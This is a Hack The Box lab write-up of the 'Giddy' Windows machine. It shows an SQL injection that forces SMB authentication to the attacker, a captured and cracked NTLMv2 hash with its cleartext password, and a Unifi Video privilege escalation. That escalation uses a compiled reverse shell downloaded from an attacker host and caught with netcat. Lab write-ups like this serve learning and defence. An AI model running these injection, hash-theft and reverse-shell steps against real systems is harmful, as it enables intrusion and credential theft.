+++
date = '2025-02-12T10:46:31-05:00'
draft = false
title = 'HtB Giddy'
tags = ['writeup','hackthebox','medium','windows']
hideToc = false
+++
![Giddy](/images/Giddy.png)

Giddy is a medium difficulty machine, which highlights how low privileged SQL Server logins can be used to compromise the underlying SQL Server service account. This is an issue in many environments, and depending on the configuration, the service account may have elevated privileges across the domain. It also features Windows registry enumeration and custom payload creation.

<!--more-->
---

## Scanning

### nmap

```sh
nmap -T4 -p- -A 10.129.96.140
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-12 00:07 EST
Nmap scan report for 10.129.96.140
Host is up (0.027s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite
| Not valid before: 2018-06-16T21:28:55
|_Not valid after:  2018-09-14T21:28:55
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_ssl-date: 2025-02-12T05:08:15+00:00; 0s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: GIDDY
|   NetBIOS_Domain_Name: GIDDY
|   NetBIOS_Computer_Name: GIDDY
|   DNS_Domain_Name: Giddy
|   DNS_Computer_Name: Giddy
|   Product_Version: 10.0.14393
|_  System_Time: 2025-02-12T05:08:11+00:00
|_ssl-date: 2025-02-12T05:08:15+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=Giddy
| Not valid before: 2025-02-11T03:52:33
|_Not valid after:  2025-08-13T03:52:33
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### 80,443/tcp - IIS 10.0

![giddy1](/images/giddy1.png)

```sh
┌──(pl4stic㉿kali)-[~/htb/giddy]
└─$ gobuster dir -u http://10.129.96.140/ -w /usr/share/wordlists/dirb/big.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.96.140/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/aspnet_client        (Status: 301) [Size: 158] [--> http://10.129.96.140/aspnet_client/]
/mvc                  (Status: 301) [Size: 148] [--> http://10.129.96.140/mvc/]
/remote               (Status: 302) [Size: 157] [--> /Remote/default.aspx?ReturnUrl=%2fremote]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
```

`https://10.129.96.140/Remote/en-US/logon.aspx`
![giddy2](/images/giddy2.png)

`http://10.129.96.140/mvc/`
![giddy3](/images/giddy3.png)

## Initial Access

### SQL Injection

Playing around with the `/mvc` endpoint, there is a search function susceptible to SQL injection.

![giddy4](/images/giddy4.png)

Trying to use `sqlmap` on this endpoint indicates a Microsoft Web Application Firewall in use, and really complicates the automation of SQL injection. Looking around, there seems to be an easier point to take advantage of this vulnerability: `http://10.129.96.140/mvc/Product.aspx?ProductSubCategoryId=28`

![giddy5](/images/giddy5.png)

```sh
┌──(pl4stic㉿kali)-[~/htb/giddy]
└─$ sqlmap -r product-req.txt --dbms mssql --risk 3 --level 5
[--snip--]
[23:41:01] [INFO] GET parameter 'ProductSubCategoryId' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'ProductSubCategoryId' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
[--snip--]
[23:42:01] [INFO] fetching database names
[23:42:01] [WARNING] reflective value(s) found and filtering out
available databases [5]:
[*] Injection
[*] master
[*] model
[*] msdb
[*] tempdb
```

#### NTLMv2 Capture

Looking through the massive amounts of tables in these databases, there doesn't seem like much to go on. After some Google searching, I came across a [blog post](https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html#database-access) by `0xdf` that detailed a way to use stacked commands in MSSQL to leak NTLMv2 hashes.

>Since Windows MSSQL allows stacked commands (ie, just adding `; [another statement]`), I can inject by adding `EXEC master..xp_dirtree "\\[my ip]\test"; --`. This will cause the db to request the file from me.

With `responder` running, and using Burpsuite, I captured and edited the HTTP request to the following:
`GET /mvc/Product.aspx?ProductSubCategoryId=28;%20EXEC%20master..xp_dirtree%20%22\\10.10.14.42\test%22;%20-- HTTP/1.1`

```sh
[+] Listening for events...
[SMB] NTLMv2-SSP Client   : 10.129.96.140
[SMB] NTLMv2-SSP Username : GIDDY\Stacy
[SMB] NTLMv2-SSP Hash     : Stacy::GIDDY:d2600b7e45b82b22:B03662EE121E164927F3D51DB65BE8CE:0101000000000000002EE8BEDF7CDB014CD174DA17225AC50000000002000800460043005900420001001E00570049004E002D005200420051005600370032005A00540051003500320004003400570049004E002D005200420051005600370032005A0054005100350032002E0046004300590042002E004C004F00430041004C000300140046004300590042002E004C004F00430041004C000500140046004300590042002E004C004F00430041004C0007000800002EE8BEDF7CDB0106000400020000000800300030000000000000000000000000300000BEE4E8ABD3A49CA980CB65CF14C4E9D26C816E5F80ABF37E2B6529CE4D4FAC200A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0034003200000000000000000000000000 
```

### Hash Crack

```sh
┌──(pl4stic㉿kali)-[~/htb/giddy]
└─$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
[--snip--]
STACY::GIDDY:d2600b7e45b82b22:b03662ee121e164927f3d51db65be8ce:0101000000000000002ee8bedf7cdb014cd174da17225ac50000000002000800460043005900420001001e00570049004e002d005200420051005600370032005a00540051003500320004003400570049004e002d005200420051005600370032005a0054005100350032002e0046004300590042002e004c004f00430041004c000300140046004300590042002e004c004f00430041004c000500140046004300590042002e004c004f00430041004c0007000800002ee8bedf7cdb0106000400020000000800300030000000000000000000000000300000bee4e8abd3a49ca980cb65cf14c4e9d26c816e5f80abf37e2b6529ce4d4fac200a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0034003200000000000000000000000000:xNnWo6272k7x
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: STACY::GIDDY:d2600b7e45b82b22:b03662ee121e164927f3d...000000
Time.Started.....: Tue Feb 11 23:57:16 2025 (0 secs)
Time.Estimated...: Tue Feb 11 23:57:16 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
```

And now it appears we have valid credentials for Stacy: `stacy:xNnWo6272k7x`

### Windows PowerShell Web Access

![giddy6](/images/giddy6.png)

![giddy7](/images/giddy7.png)

## Privilege Escalation

### Unifi Video (CVE-2016-6914)

One of the first files we see in Stacy's documents folder is one named, `unifivideo`. The contents are underwhelming, but it's a possible vector. After some Google research on Unifi Video, there appears to be a [privilege escalation vulnerability](https://www.exploit-db.com/exploits/43390) associated with it.

>By copying an arbitrary "taskkill.exe" to "C:\ProgramData\unifi-video\\" as an unprivileged user, it is therefore possible to escalate privileges and execute arbitrary code as NT AUTHORITY/SYSTEM.

```PowerShell
PS C:\ProgramData>
icacls unifi-video
unifi-video NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
            BUILTIN\Administrators:(I)(OI)(CI)(F)
            CREATOR OWNER:(I)(OI)(CI)(IO)(F)
            BUILTIN\Users:(I)(OI)(CI)(RX)
            BUILTIN\Users:(I)(CI)(WD,AD,WEA,WA)

Successfully processed 1 files; Failed processing 0 files
```

We found out earlier that Windows Defender was blocking metasploit payloads, so we may have to compile our own reverse shell. Not too complicated, we'll use this [GitHub repo](https://github.com/dev-frog/C-Reverse-Shell) for that. Let's generate the reverse shell, transfer it to the victim, copy it to `C:\ProgramData\unifi-video\taskkill.exe`, and restart the service.

```sh
┌──(pl4stic㉿kali)-[~/htb/giddy]
└─$ i686-w64-mingw32-g++ rev.cpp -o rev.exe -lws2_32 -lwininet -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc

┌──(pl4stic㉿kali)-[~/htb/giddy]
└─$ python3 -m http.server 80                                                                               
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```PowerShell
PS C:\Users\Stacy\Documents> Invoke-WebRequest http://10.10.14.42/rev.exe -OutFile rev.exe
PS C:\Users\Stacy\Documents> copy rev.exe C:\ProgramData\unifi-video\taskkill.exe
PS C:\Users\Stacy\Documents> stop-service UnifiVideoService -Force
PS C:\Users\Stacy\Documents> start-service UnifiVideoService
```

Meanwhile, on our listener...

```sh
┌──(pl4stic㉿kali)-[~/htb/giddy/Ebowla]
└─$ nc -nvlp 4444                                                                   
listening on [any] 4444 ...
connect to [10.10.14.42] from (UNKNOWN) [10.129.66.24] 49722
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\ProgramData\unifi-video>whoami
whoami
nt authority\system

C:\ProgramData\unifi-video>
```

## Attack Flow

![attack-flow](/images/HtB-Giddy.png)